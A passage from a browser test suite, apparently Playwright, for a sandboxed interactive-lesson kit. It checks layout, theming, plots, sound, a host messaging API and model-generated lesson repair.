  expect('srcdoc starts with the Content-Security-Policy', await app.page.evaluate(() => /^<!doctype html><html lang="en"><head><meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'/.test(U.sandbox.srcdoc('<p>x</p>'))));
  app.errors.splice(0);
  await app.close();
}

// ---------- the kit in a live frame: reveal, choices, layout, colours, plots, sound, reach ----------
section('the kit in a live frame');
{
  const app = await openApp({ width: 360, height: 800, file: PAGE });
  await app.page.goto(app.url('#/'));
  await app.page.evaluate(() => U.rt.ready);
  // Mount a body in a fresh host box; returns its frame.
  async function live(html, key = 'm') {
    await app.page.evaluate(async ([h, k]) => {
      if (window[k]) window[k].destroy();
      const box = document.body.appendChild(document.createElement('div'));
      box.style.cssText = 'max-width:720px;margin:16px auto;padding:0 16px';
      window[k] = U.sandbox.mount(box, { html: h });
      await window[k].ready;
      await new Promise((r) => setTimeout(r, 300));
    }, [html, key]);
    return app.page.frames().find((f) => f !== app.page.mainFrame() && f.url() === 'about:srcdoc' && !f.isDetached());
  }
  const host = (fn, arg) => app.page.evaluate(fn, arg);

  // Kept until Dan moves.
  const hidden = body(plain + "\nwindow.__after = 0; K.afterMove(() => { window.__after++; });\nK.readout({ id: 'ans', label: 'The answer', afterMove: true, into: '#o' });\n" +
    "K.model((p) => ({ y: p.a * 2, ans: p.a * 10 }));\nK.update((p) => { K.$('#say').textContent = K.moved ? 'revealed' : 'guess first'; });",
    { html: '<p class="k-after-move" id="secret">The answer is here</p><p id="say"></p>' }).replace("K.model((p) => ({ y: p.a * 2 }));", '');
  let fr = await live(hidden);
  const state = () => fr.evaluate(() => ({ vis: getComputedStyle(K.$('#secret')).visibility, h: K.$('#secret').offsetHeight, ans: K.$('[data-id=ans] .k-readout-value').textContent,
    say: K.$('#say').textContent, moved: K.moved, after: window.__after }));
  let st = await state();
  expect('before a move: k-after-move is hidden but keeps its space, the readout shows "?", K.moved is false',
    st.vis === 'hidden' && st.h > 10 && st.ans === '?' && st.say === 'guess first' && !st.moved && st.after === 0, st);
  const selfRep = await host(() => window.m.selftest());
  st = await state();
  expect('the self-test does not count as a move (all still hidden after it)', selfRep.ok && st.vis === 'hidden' && st.ans === '?' && !st.moved && st.after === 0, { st, selfRep });
  const got = await host(() => window.m.get());
  expect('the host still reads the real value while it is hidden', got.outputs.ans === 5, got);
  await fr.focus('#k-a');
  await app.page.keyboard.press('ArrowRight');
  await app.page.waitForTimeout(200);
  st = await state();
  expect('the first slider move reveals everything and runs K.afterMove once', st.vis === 'visible' && st.ans === '6' && st.say === 'revealed' && st.moved && st.after === 1, st);
  await app.page.keyboard.press('ArrowRight');
  await app.page.waitForTimeout(150);
  expect('...and only once', (await state()).after === 1);
  fr = await live(hidden);
  await host(() => window.m.set('a', 0.2));
  st = await state();
  expect('a host set() counts as a move too', st.vis === 'visible' && st.ans === '2' && st.moved, st);

  // Choices by value, label or index, from the host.
  fr = await live(choiceBody.replace("p.pick === 'e' ? NaN : 1", "['a', 'b', 'c', 'd', 'e', 'f'].indexOf(p.pick)"));
  let ch = await host(() => window.m.get());
  expect('a choice opens on the option its index names (value: 1 -> "b")', ch.params.pick === 'b' && ch.outputs.y === 1, ch);
  ch = await host(() => window.m.set('pick', 3));
  expect('host set() by index', ch.params.pick === 'd' && ch.outputs.y === 3, ch);
  ch = await host(() => window.m.set('pick', 'Label E'));
  expect('host set() by label', ch.params.pick === 'e', ch);
  ch = await host(() => window.m.set('pick', 'f'));
  expect('host set() by value', ch.params.pick === 'f', ch);
  const badPick = await host(() => window.m.set('pick', 'zz').then(() => 'resolved', (e) => e.code));
  expect('host set() to a missing option rejects', badPick === 'kit_error', badPick);
  const ins = await host(() => window.m.inputs());
  expect('inputs() lists the choice and its options', ins.inputs[0].kind === 'choice' && ins.inputs[0].options.length === 6 && ins.inputs[0].labels[4] === 'Label E', ins);
  await fr.click('.k-seg button:nth-child(1)');
  await app.page.waitForTimeout(150);
  expect('tapping an option sets it', (await host(() => window.m.get())).params.pick === 'a');

  // Small-screen layout at 340 px wide.
  const layout = '<div class="k-controls" id="c"></div><div class="k-readouts" id="o"></div><script>\n' +
    "K.control({ id: 'hi', label: \"High note's wobbles per second\", min: 120, max: 250, step: 1, value: 181, unit: 'per second', into: '#c' });\n" +
    "K.readout({ id: 'n', label: 'Times a second they start a wobble together', into: '#o' });\n" +
    "K.readout({ id: 'gap', label: 'Low-note wobbles between line-ups', into: '#o' });\n" +
    "K.readout({ id: 'ratio', label: 'High wobbles for every low wobbles', into: '#o' });\n" +
    "const g = (a, b) => b ? g(b, a % b) : a;\nK.model((p) => ({ n: g(p.hi, 120), gap: 120 / g(p.hi, 120), ratio: p.hi + ' for every 120' }));\n" +
    "K.check('one', () => true); K.check('two', () => true); K.check('three', () => true);\nK.ready();\n</script>";
  fr = await live(layout);
  const lay = await fr.evaluate(() => {
    const sc = [...document.querySelectorAll('.k-scale span')].map((s) => s.getBoundingClientRect());
    const lh = (el) => parseFloat(getComputedStyle(el).lineHeight);
    const labels = [...document.querySelectorAll('.k-readout-label')].map((l) => Math.round(l.getBoundingClientRect().height / lh(l)));
    const vals = [...document.querySelectorAll('.k-readout-value')].map((v) => ({ text: v.textContent, cut: v.scrollWidth > v.clientWidth + 1, bottom: Math.round(v.getBoundingClientRect().bottom) }));
    const head = document.querySelector('.k-field-label');
    return { width: document.documentElement.clientWidth, scale: sc.map((r) => ({ h: Math.round(r.height), l: r.left, r: r.right })), labels, vals, headLines: Math.round(head.getBoundingClientRect().height / lh(head)) };
  });
  expect('at phone width the slider end labels sit on one line each and do not collide',
    lay.scale.every((r) => r.h <= 20) && lay.scale[0].r + 6 <= lay.scale[1].l, lay);
  expect('readout labels wrap to two lines at most', lay.labels.every((n) => n <= 2), lay.labels);
  expect('readout values are never cut ("181 for every 120" shown whole)', lay.vals.every((v) => !v.cut) && lay.vals.some((v) => v.text === '181 for every 120'), lay.vals);
  expect('the control label keeps to two lines beside its value', lay.headLines <= 2, lay.headLines);
  const layRep = await host(() => window.m.selftest());
  expect('...and the layout body passes its self-test with nothing clipped', layRep.ok && !layRep.clipped.length, layRep.clipped);

  // Rounding.
  const fmt = await fr.evaluate(() => [K.fmt(2.5), K.fmt(1628.89), K.fmt(5), K.fmt(0.1234), K.fmt(12.345), K.fmt(99.96), K.fmt(3, { decimals: 2 }), K.fmt(-0.5), K.fmt(2e16), K.fmt(77.57, { decimals: 2, prefix: '£' })]);
  expect('K.fmt rounds sensibly: whole numbers whole, 3 significant figures kept, decimals honoured',
    JSON.stringify(fmt) === JSON.stringify(['2.50', '1,629', '5', '0.123', '12.3', '100', '3.00', '−0.500', '2 × 10¹⁶', '£77.57']), fmt);
  fr = await live(body("K.model((p) => ({ y: p.a * 155.5 }));\nconst d2 = K.readout({ id: 'money', label: 'Money', prefix: '£', decimals: 2, into: '#o' });\nK.update(() => d2.set(77.571));"));
  const rd = await fr.evaluate(() => ({ y: K.$('[data-id=y] .k-readout-value').textContent, money: K.$('[data-id=money] .k-readout-value').textContent }));
  expect('readouts use that rounding (77.75 -> "77.8"; decimals: 2 -> "£77.57")', rd.y === '77.8' && rd.money === '£77.57', rd);

  // Colours: the dark fills are clearly visible against the dark page.
  await app.page.evaluate(() => { document.documentElement.dataset.muTheme = 'dark'; });
  await app.page.waitForTimeout(300);
  const pal = await fr.evaluate(() => {
    const lum = (c) => { const p = c.match(/[\d.]+/g).slice(0, 3).map(Number).map((v) => { v /= 255; return v <= 0.03928 ? v / 12.92 : Math.pow((v + 0.055) / 1.055, 2.4); }); return 0.2126 * p[0] + 0.7152 * p[1] + 0.0722 * p[2]; };
    const contrast = (a, b) => { const x = lum(a), y = lum(b); return (Math.max(x, y) + 0.05) / (Math.min(x, y) + 0.05); };
    const css = (name) => { const d = document.createElement('div'); d.style.color = 'var(--k-' + name + ')'; document.body.appendChild(d); const c = getComputedStyle(d).color; d.remove(); return c; };
    const bg = css('bg'), out = { dark: K.theme.dark };
    ['fill1', 'fill2', 'fill3', 'hl', 'amber-line', 'cat1', 'cat2', 'cat3', 'cat4', 'accent2'].forEach((k) => { out[k] = +contrast(css(k), bg).toFixed(2); });
    out.alpha = K.color('accent2', 0.3);
    out.inkOnFill2 = +contrast(css('ink'), css('fill2')).toFixed(2);
    return out;
  });
  expect('dark mode: fills and highlights stand out from the page (contrast >= 1.6), lines and categories >= 3',
    pal.dark && ['fill1', 'fill2', 'fill3', 'hl'].every((k) => pal[k] >= 1.6) && ['amber-line', 'cat1', 'cat2', 'cat3', 'cat4', 'accent2'].every((k) => pal[k] >= 3) && pal.inkOnFill2 >= 3.5, pal);
  expect('K.color(role, alpha) gives a see-through colour', /^rgba\(\d+, \d+, \d+, 0\.3\)$/.test(pal.alpha), pal.alpha);
  await app.page.evaluate(() => { document.documentElement.dataset.muTheme = 'light'; });
  await app.page.waitForTimeout(300);
  const palL = await fr.evaluate(() => ({ fill2: getComputedStyle(document.documentElement).getPropertyValue('--k-fill2').trim(), amberLine: K.theme.c.amberLine, dark: K.theme.dark }));
  expect('light mode keeps calm fills and a strong amber line', !palL.dark && palL.fill2 === '#F8D47A' && palL.amberLine === '#B7791F', palL);

  // Plots: shading between lines, labels clear of lines.
  const plotBody = '<div id="pl"></div><div class="k-controls" id="c"></div><script>\n' +
    "K.control({ id: 'k', label: 'k', min: 0.2, max: 1, step: 0.1, value: 0.5, into: '#c' });\n" +
    "const pl = K.plot('#pl', { x: { min: 0, max: 10, label: 'x' }, y: { min: 0, max: 10, label: 'y' } });\n" +
    "K.update((p) => pl.draw({ series: [{ fn: (x) => x, label: 'upper' }, { fn: (x) => p.k * x, label: 'lower' }], shade: [{ between: ['upper', 'lower'], label: 'the gap' }, { between: ['lower', 0], x0: 0, x1: 2, color: 'fill1' }],\n" +
    "  marks: [{ x: 5, y: 5, label: 'five, five' }], lines: [{ x: 9.6, label: 'near the edge' }] }));\n" +
    "K.check('one', () => true); K.check('two', () => true); K.check('three', () => true);\nK.ready();\n</script>";
  fr = await live(plotBody);
  const pinfo = await fr.evaluate(() => {
    const api = K.$('#pl').__kplot, cv = api.canvas, c2 = cv.getContext('2d'), dpr = cv.width / cv.clientWidth;
    const px = (x, y) => [...c2.getImageData(Math.round(api.x(x) * dpr), Math.round(api.y(y) * dpr), 1, 1).data];
    const onLine = (l) => { for (let x = 0; x <= 10; x += 0.05) { const X = api.x(x), Y = api.y(x); if (X > l.x && X < l.x + l.w && Y > l.y && Y < l.y + l.h) return true; } return false; };
    const labels = api.labels;
    return { gap: px(8, 6), outside: px(2, 9), labels, markOnLine: labels.filter((l) => l.text === 'five, five').map(onLine)[0],
      lineLabel: labels.find((l) => l.text === 'near the edge'), lineX: api.x(9.6), box: api.box, gapLabel: labels.find((l) => l.text === 'the gap') };
  });
  const tinted = (c) => c[3] > 40 && !(c[0] > 245 && c[1] > 245 && c[2] > 245);
  expect('shade fills the gap between two series (and not outside it)', tinted(pinfo.gap) && !tinted(pinfo.outside), pinfo);
  expect('the shade label is drawn', !!pinfo.gapLabel, pinfo.labels);
  expect('a mark label sits clear of the line through its dot', pinfo.markOnLine === false, pinfo.labels);
  expect('a reference line label sits beside its line (not across it), inside the plot',
    pinfo.lineLabel && (pinfo.lineLabel.x + pinfo.lineLabel.w <= pinfo.lineX || pinfo.lineLabel.x >= pinfo.lineX) && pinfo.lineLabel.x >= pinfo.box.x, pinfo);

  // K.labels nudges a label off a fixed one.
  fr = await live('<svg id="sv" viewBox="0 0 200 60" width="100%"><text x="100" y="30" text-anchor="middle" font-size="12">fixed label</text><g id="lg"></g></svg><div class="k-controls" id="c"></div><script>\n' +
    "K.control({ id: 'a', label: 'A', min: 0, max: 1, step: 0.5, value: 0.5, into: '#c' });\nK.update(() => K.labels('#lg', [{ x: 100, y: 30, text: 'moving label' }, { x: 199, y: 12, text: 'edge label' }]));\n" +
    "K.check('one', () => true); K.check('two', () => true); K.check('three', () => true);\nK.ready();\n</script>");
  const lb = await fr.evaluate(() => { const t = [...document.querySelectorAll('text')].map((e) => e.getBoundingClientRect()); const s = K.$('#sv').getBoundingClientRect();
    const ov = (a, b) => a.left < b.right && b.left < a.right && a.top < b.bottom && b.top < a.bottom; return { overlap: ov(t[0], t[1]), inside: t.every((r) => r.left >= s.left - 1 && r.right <= s.right + 1) }; });
  const lbRep = await host(() => window.m.selftest());
  expect('K.labels moves a label off another and keeps labels inside the drawing', !lb.overlap && lb.inside && lbRep.ok, { lb, clipped: lbRep.clipped });

  // Sound in the real frame: plays after a press, never before.
  fr = await live(body(plain + "\nK.sound.tone(440);\nK.button({ label: 'Hear it', into: '#c', press: () => K.sound.chord([261.63, 329.63, 392], { dur: 0.5 }) });"));
  const before = await fr.evaluate(() => ({ playing: K.sound.playing }));
  await fr.click('button.k-btn');
  await app.page.waitForTimeout(120);
  const after = await fr.evaluate(() => ({ playing: K.sound.playing, muted: K.sound.muted, ready: K.sound.ready }));
  const sw = await host(() => window.m.selftest());
  expect('K.sound stays silent on load (with advice) and plays after a press, under the CSP', !before.playing && after.playing && after.ready && !after.muted && sw.warnings.some((w) => /before Dan pressed anything/.test(w)), { before, after, w: sw.warnings });
  await fr.evaluate(() => K.sound.stop());

  // Figures are capped on desktop and centred, and fill the phone.
  const figBody = '<svg id="fig" viewBox="0 0 340 200" width="100%" role="img" aria-label="f"><rect width="340" height="200" fill="var(--k-panel)"/><text x="10" y="20" font-size="12">label</text></svg>' +
    '<p>Icon <svg id="icon" viewBox="0 0 16 16" width="16" height="16"><circle cx="8" cy="8" r="6"/></svg> inline</p>' + body(plain);
  fr = await live(figBody);
  const phone = await fr.evaluate(() => ({ w: K.$('#fig').getBoundingClientRect().width, col: document.body.clientWidth - 32, fig: K.$('#fig').classList.contains('k-fig'), icon: K.$('#icon').classList.contains('k-fig') }));
  expect('at phone width a figure fills the column', phone.fig && !phone.icon && Math.abs(phone.w - phone.col) <= 2, phone);
  await app.close();

  const wide = await openApp({ width: 1280, height: 900, file: PAGE });
  await wide.page.goto(wide.url('#/'));
  await wide.page.evaluate(async (html) => {
    await U.rt.ready;
    const box = document.body.appendChild(document.createElement('div'));
    box.style.cssText = 'max-width:720px;margin:16px auto;padding:0 16px';
    window.m = U.sandbox.mount(box, { html });
    await window.m.ready;
    await new Promise((r) => setTimeout(r, 300));
  }, figBody);
  const wf = wide.page.frames().find((f) => f !== wide.page.mainFrame());
  const desk = await wf.evaluate(() => { const r = K.$('#fig').getBoundingClientRect(); return { w: r.width, left: r.left, right: document.documentElement.clientWidth - r.right, page: document.documentElement.clientWidth }; });
  expect('on desktop a 340-wide figure is capped near 1.45x (493 px) and centred', Math.abs(desk.w - 493) <= 2 && Math.abs(desk.left - desk.right) <= 2, desk);

  // K.stage on a laptop: a visual centred with a max-width and auto margins fills the stage's
  // left column (up to that max-width), so a grid of tiles in it is not squeezed to one column.
  // The july-1914 exemplar shows its seven tiles four to a row in the lesson's laptop frames.
  const tileBody = body(plain + "\nK.stage('#scene', '#c');", { html: '<div id="scene" style="max-width:560px;margin-left:auto;margin-right:auto">' +
    '<div id="tiles" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(6rem,1fr));gap:8px">' +
    ['Serbia', 'Germany', 'Russia', 'France', 'Belgium', 'Britain'].map((t) => '<b class="panel">' + t + '</b>').join('') + '</div></div>' });
  const july = examples.find((e) => e.name === 'july-1914').body;
  for (const [name, html, tiles] of [['a centred tile grid', tileBody, '#tiles > *'], ['july-1914', july, '.nation']]) {
    for (const w of [926, 1086]) {
      await wide.page.evaluate(async ([h, width]) => {
        if (window.st) window.st.destroy();
        const box = document.getElementById('stagebox') || document.body.appendChild(Object.assign(document.createElement('div'), { id: 'stagebox' }));
        box.style.cssText = 'width:' + width + 'px';
        window.st = U.sandbox.mount(box, { html: h });
        await window.st.ready;
        await new Promise((r) => setTimeout(r, 300));
      }, [html, w]);
      const sf = wide.page.frames().filter((f) => f !== wide.page.mainFrame() && !f.isDetached()).pop();
      const s = await sf.evaluate((sel) => {
        const st = document.querySelector('.k-stage'), v = st.firstElementChild, c = st.lastElementChild;
        const col = parseFloat(getComputedStyle(st).gridTemplateColumns), max = parseFloat(getComputedStyle(v).maxWidth) || Infinity;
        const lefts = [...document.querySelectorAll(sel)].map((t) => Math.round(t.getBoundingClientRect().left));
        return { col: Math.round(col), visual: Math.round(v.getBoundingClientRect().width), max, beside: c.getBoundingClientRect().left > v.getBoundingClientRect().right, cols: new Set(lefts).size, tiles: lefts.length };
      }, tiles);
      expect(`${name} in a ${w} px K.stage: the visual fills its column (up to its max-width) beside the controls, tiles ${name === 'july-1914' ? 'four' : 'several'} to a row`,
        s.beside && Math.abs(s.visual - Math.min(s.col, s.max)) <= 2 && (name === 'july-1914' ? s.cols === 4 : s.cols >= 4), s);
    }
  }
  await wide.page.evaluate(() => { window.st.destroy(); document.getElementById('stagebox').remove(); });

  // reach(): can the lesson's target be met by moving its control?
  const brayton = examples.find((e) => e.kind === 'quantity').body;
  const sorter = examples.find((e) => e.kind === 'concept').body;
  const reach = await wide.page.evaluate(async ([b, srt]) => ({
    yes: await U.sandbox.reach(b, { control: 'r', output: 'eff', target: 60, tolerance: 1.5 }),
    no: await U.sandbox.reach(b, { control: 'r', output: 'eff', target: 80, tolerance: 1 }),
    choice: await U.sandbox.reach(srt, { control: 'by', output: 'alike', target: 100, tolerance: 0 }),
    missing: await U.sandbox.reach(b, { control: 'nope', output: 'eff', target: 1, tolerance: 1 }),
    mounted: await U.sandbox.reach(window.m, { control: 'a', output: 'y', target: 1.4, tolerance: 0.01 }),
  }), [brayton, sorter]);
  expect('reach(): a reachable target reports the setting that meets it', reach.yes.reachable && reach.yes.best.value === 25 && near(reach.yes.best.output, 60.1, 0.1) && reach.yes.tried === 50, reach.yes);
  expect('reach(): an unreachable target says so, with the closest it gets', !reach.no.reachable && reach.no.best.value === 50 && near(reach.no.best.output, 67.3, 0.05), reach.no);
  expect('reach(): a choice is tried through every option', reach.choice.reachable && reach.choice.best.value === 'column' && reach.choice.tried === 3, reach.choice);
  expect('reach(): a missing control is not reachable, with a reason', !reach.missing.reachable && /No control "nope"/.test(reach.missing.error || ''), reach.missing);
  expect('reach(): works on a mounted frame too', reach.mounted.reachable && reach.mounted.best.value === 0.7, reach.mounted);
  expect('no page errors in the live-frame tests', !wide.errors.length, wide.errors);
  await wide.close();
}

// ---------- the exemplars and the KIT.md example pass, with zero page errors ----------
section('exemplars and the host API');
{
  let sampleHandler = null;
  const app = await openApp({ width: 360, height: 800, file: PAGE, sample: (input, info) => sampleHandler(input, info) });
  await app.page.goto(app.url('#/'));
  await app.page.evaluate(() => U.rt.ready);
  const test = (html, o) => app.page.evaluate(([h, opts]) => U.sandbox.test(h, opts), [html, o || {}]);
  for (const ex of examples.concat([{ name: 'KIT.md example', body: kitExample }])) {
    const t0 = Date.now();
    const r = await test(ex.body, { widths: [340, 720, 1040] });
    expect(ex.name + ' passes at 340, 720 and 1040 (' + (Date.now() - t0) + ' ms)', r.ok && r.widths.every((w) => w.ok) && !r.overflow && r.sweep.ok && !r.errors.length, r);
    expect(ex.name + ': 3+ checks, all pass, one cites a source', r.checks.length >= 3 && r.checks.every((c) => c.ok) && r.checks.some((c) => /^https:\/\//.test(c.source || '')), r.checks);
    expect(ex.name + ': no warnings', !(r.warnings || []).length, r.warnings);
    // In the lesson's frame on a 360 / 390 px phone at Text size XL: no word splits ("German/y").
    const xl = await app.page.evaluate((h) => U.sandbox.test(h, { widths: [338, 368], theme: Object.assign(U.sandbox.theme(), { size: 20 }) }), ex.body);
    expect(ex.name + ' at Text size XL in a 338 and 368 px frame: every word whole, nothing cut off', xl.ok && !xl.clipped.length, xl.clipped.concat(xl.errors));
  }

  // mount: ready, get/set, sandbox, spoofed messages, keyboard, onChange, theme, errors, destroy
  const brayton = examples.find((e) => e.kind === 'quantity').body;
  const m = await app.page.evaluate(async (html) => {
    window.__changes = []; window.__errs = [];
    const box = document.createElement('div');
    box.id = 'host';
    document.body.appendChild(box);
    window.__m = U.sandbox.mount(box, { html, title: 'Brayton', onChange: (s) => window.__changes.push(s), onError: (e) => window.__errs.push(e) });
    const checks = await window.__m.ready;
    const f = window.__m.frame;
    return { checks, sandbox: f.getAttribute('sandbox'), state: f.parentNode.dataset.state, h: f.getBoundingClientRect().height };
  }, brayton);
  expect('mount: ready resolves with the passing checks', m.checks.length === 5 && m.checks.every((c) => c.ok), m.checks);
  expect('mount: the frame is sandboxed with allow-scripts only', m.sandbox === 'allow-scripts', m.sandbox);
  await app.page.waitForTimeout(400);
  const sized = await app.page.evaluate(() => ({ h: __m.frame.getBoundingClientRect().height, state: __m.el.dataset.state }));
  expect('mount: the frame grows to its content and shows', sized.h > 600 && sized.state === 'live', sized);
  const s1 = await app.page.evaluate(() => __m.get());
  expect('get() returns params and outputs', s1.params.r === 8 && near(s1.outputs.eff, 44.7955, 1e-3), s1);
  const s2 = await app.page.evaluate(() => __m.set('r', 10));
  expect('set() moves a control and returns the new state', s2.params.r === 10 && near(s2.outputs.eff, 48.2053, 1e-3), s2);
  const bad = await app.page.evaluate(() => __m.set('nope', 1).then(() => 'resolved', (e) => e.code));
  expect('set() on an unknown id rejects', bad === 'kit_error', bad);
  const spoof = await app.page.evaluate(async () => {
    await new Promise((r) => setTimeout(r, 400));   // let the frame settle after set()
    const before = __m.frame.style.height;
    window.postMessage({ src: 'kit', type: 'height', px: 7 }, '*');
    await new Promise((r) => setTimeout(r, 150));
    return before === __m.frame.style.height;
  });
  expect('messages not from the frame itself are ignored', spoof);
  const frame = app.page.frames().find((f) => f !== app.page.mainFrame());
  await frame.focus('#k-r');
  await app.page.keyboard.press('ArrowRight');
  await app.page.waitForTimeout(450);
  const change = await app.page.evaluate(() => window.__changes[window.__changes.length - 1]);
  expect('the slider works from the keyboard and the host hears the change', change && change.params.r === 11 && near(change.outputs.eff, 100 * (1 - Math.pow(11, -0.4 / 1.4)), 1e-6), change);
  const shown = await frame.evaluate(() => ({ out: document.querySelector('output').textContent, eff: document.querySelector('[data-id="eff"] .k-readout-value').textContent, aria: document.querySelector('#k-r').getAttribute('aria-valuetext') }));
  expect('the live value, readout and aria-valuetext follow', shown.out === '11:1' && shown.eff === '49.6%' && shown.aria === '11:1', shown);
  await app.page.evaluate(() => { document.documentElement.dataset.muTheme = 'dark'; });
  await app.page.waitForTimeout(300);
  const dark = await frame.evaluate(() => ({ dark: K.theme.dark, attr: document.documentElement.dataset.theme, bg: getComputedStyle(document.body).backgroundColor }));
  const hostTheme = await app.page.evaluate(() => U.sandbox.theme());
  expect('the frame follows the app into dark mode', dark.dark && dark.attr === 'dark' && hostTheme.dark && hostTheme.c.bg.toLowerCase() === '#1a2029', { dark, hostTheme });
  await app.page.evaluate(() => { document.documentElement.dataset.muTheme = 'light'; });
  // Text size: the setting scales the app's root font size (--fs stays 1.125rem), and the kit size
  // follows: 16 / 18 / 20 px at M / L / XL. Inside the frame the body and rem sizes both follow.
  const sizes = await app.page.evaluate(() => ['s', 'm', 'l', 'xl'].map((s) => { document.documentElement.dataset.size = s; return U.sandbox.theme().size; }));
  expect('theme().size follows Text size: 16 / 16 / 18 / 20 at S / M / L / XL', sizes.join() === '16,16,18,20', sizes);
  await app.page.waitForTimeout(300);
  const xl = await frame.evaluate(() => ({ size: K.theme.size, root: getComputedStyle(document.documentElement).fontSize, body: getComputedStyle(document.body).fontSize,
    readout: getComputedStyle(document.querySelector('.k-readout-label')).fontSize }));
  expect('at XL the frame\'s text is 20 px, rem sizes too (readout label 17 px)', xl.size === 20 && xl.root === '20px' && xl.body === '20px' && xl.readout === '17px', xl);
  await app.page.evaluate(() => { delete document.documentElement.dataset.size; });
  await app.page.waitForTimeout(300);
  const m16 = await frame.evaluate(() => getComputedStyle(document.body).fontSize);
  expect('back at M the frame\'s text is 16 px again', m16 === '16px', m16);
  const st = await app.page.evaluate(() => __m.selftest());
  expect('selftest() on a mounted frame returns a passing report', st.ok && st.checks.length === 5, st);
  await app.page.evaluate(() => __m.destroy());
  const gone = await app.page.evaluate(() => __m.get().then(() => 'resolved', (e) => e.code + ':' + !!document.querySelector('#host .kit-frame')));
  expect('destroy() removes the frame and later requests reject', gone === 'gone:false', gone);

  // K.stage: the controls sit beside the visual in a laptop-wide frame, under it in a phone-wide
  // one, and beside: false keeps them under it at any width.
  await app.page.setViewportSize({ width: 1280, height: 900 });
  const staged = examples.find((e) => /K\.stage\('#plot', '#controls'/.test(e.body));
  expect('an exemplar shows K.stage with a plot', !!staged);
  const stacked = staged.body.replace(/K\.stage\('#plot', '#controls'(, \{ max: (\d+) \})?\)/, (_, __, max) => "K.stage('#plot', '#controls', { " + (max ? 'max: ' + max + ', ' : '') + 'beside: false })');
  expect('the stacked variant really sets beside: false', stacked.includes('beside: false'));
  for (const [html, w, want] of [[staged.body, 1048, 'beside'], [staged.body, 360, 'under'], [stacked, 1048, 'under']]) {
    await app.page.evaluate(async ([h, width]) => {
      const box = document.createElement('div');
      box.style.width = width + 'px';
      document.body.appendChild(box);
      window.__probe = U.sandbox.mount(box, { html: h });
      await window.__probe.ready;
    }, [html, w]);
    const fr = app.page.frames().filter((f) => f !== app.page.mainFrame()).pop();
    const got = await fr.evaluate(() => {
      const st = document.querySelector('.k-stage');
      const a = st.children[0].getBoundingClientRect(), b = st.children[1].getBoundingClientRect();
      return b.left >= a.right - 1 && b.top < a.bottom ? 'beside' : b.top >= a.bottom - 1 ? 'under' : 'overlap';
    });
    expect('K.stage at ' + w + ' px' + (html === stacked ? ' with beside: false' : '') + ': controls ' + want + ' the visual', got === want, got);
    await app.page.evaluate(() => { __probe.destroy(); });
  }
  // Halos: dark labels on the page get one; a white label on a navy box does not.
  await app.page.evaluate(async () => {
    const box = document.createElement('div');
    box.style.width = '600px';
    document.body.appendChild(box);
    window.__halo = U.sandbox.mount(box, { html: '<svg viewBox="0 0 340 80" width="100%" role="img" aria-label="x"><line x1="0" y1="20" x2="340" y2="20" stroke="black"/><text id="dark" x="10" y="24" fill="var(--k-ink)">on the page</text><rect x="150" y="40" width="150" height="30" fill="var(--k-accent2)"/><text id="light" x="160" y="60" fill="var(--k-on-accent2)">on navy</text><text id="nofill" x="10" y="70">no fill</text><g fill="var(--k-warn)"><text id="ingroup" x="10" y="78">group fill</text></g></svg><script>K.model(() => ({})); K.check("a", () => true); K.ready();</script>' });
    await window.__halo.ready;
  });
  await app.page.waitForTimeout(200);
  const hf = app.page.frames().filter((f) => f !== app.page.mainFrame()).pop();
  const halo = await hf.evaluate(() => ({ dark: document.getElementById('dark').classList.contains('k-halo'), light: document.getElementById('light').classList.contains('k-halo'), paint: getComputedStyle(document.getElementById('dark')).paintOrder,
    nofill: getComputedStyle(document.getElementById('nofill')).fill, ink: getComputedStyle(document.body).color, group: getComputedStyle(document.getElementById('ingroup')).fill, warn: K.theme.c.warn }));
  expect('a dark label crossing a line gets a page-coloured halo; white text on navy does not', halo.dark && !halo.light && /stroke/.test(halo.paint), halo);
  expect('text with no fill of its own takes the theme ink (not black), and a group fill still wins', halo.nofill === halo.ink && halo.group !== halo.ink, halo);
  await app.page.evaluate(() => { __halo.destroy(); });
  await app.page.setViewportSize({ width: 360, height: 800 });

  expect('no page errors on the host page so far', app.errors.length === 0, app.errors);
  const late = body(plain + "\nsetTimeout(() => { throw new Error('late trouble'); }, 50);");
  const lateLine = late.split('\n').findIndex((l) => l.includes('late trouble')) + 1;
  const errs = await app.page.evaluate(async (html) => {
    const got = [];
    const mm = U.sandbox.mount(document.body.appendChild(document.createElement('div')), { html, onError: (e) => got.push(e) });
    await mm.ready;
    await new Promise((r) => setTimeout(r, 300));
    mm.destroy();
    return got;
  }, late);
  expect('a runtime error reaches onError with its body line', errs.some((e) => e.includes('late trouble') && e.includes('(body line ' + lateLine + ')')), errs);
  app.errors.splice(0); // that error was thrown on purpose inside the frame

  // extract()
  const ex = await app.page.evaluate(() => [
    U.interactive.extract('Here you go:\n```html\n<p>a</p>\n<script>K.ready()</script>\n```\nEnjoy!'),
    U.interactive.extract('<!DOCTYPE html><html><head><title>t</title><meta charset="utf-8"><style>p{}</style></head><body class="x"><p>b</p></body></html>'),
    U.interactive.extract('Sure! <div>c</div> trailing words'),
    U.interactive.extract('no html at all'),
  ]);
  expect('extract() takes the fenced block', ex[0] === '<p>a</p>\n<script>K.ready()</script>', ex[0]);
  expect('extract() strips doctype/html/head/body but keeps head styles', ex[1] === '<style>p{}</style><p>b</p>', ex[1]);
  expect('extract() drops prose around bare HTML', ex[2] === '<div>c</div>', ex[2]);
  expect('extract() returns empty text when there is no HTML', ex[3] === '', ex[3]);

  // build(): a broken first reply is repaired; prompts are routed by TASK on the complex tier
  const good = examples.find((e) => e.kind === 'quantity').body;
  const broken = good.replace('K.ready();', '').replace("K.near(K.at({ r: 10 }).eff, 48.205, 0.001)", "K.near(K.at({ r: 10 }).eff, 50, 0.001)");
  let seen = [];
  sampleHandler = (input, info) => {
    seen.push({ task: taskOf(input), tier: info.tier, text: typeof input === 'string' ? input : JSON.stringify(input) });
    return seen.length === 1 ? 'Here is the interactive.\n```html\n' + broken + '\n```' : good;
  };
  const res = await app.page.evaluate(async ([t, i, l]) => {
    const status = [];
    const r = await U.interactive.build(t, i, l, { onStatus: (s) => status.push(s) });
    return { r, status };
  }, [topic, topic.ideas[0], lesson]);
  expect('build(): repairs a failing body and returns it', res.r && res.r.attempts === 2 && res.r.selftest.ok && res.r.html.includes('K.ready()') && res.r.title === 'Pressure ratio and efficiency', res.r && { attempts: res.r.attempts, ok: res.r.selftest.ok });
  expect('build(): asks build-interactive then repair-interactive on the complex tier', seen.map((s) => s.task + '/' + s.tier).join() === 'build-interactive/complex,repair-interactive/complex', seen.map((s) => s.task + '/' + s.tier));
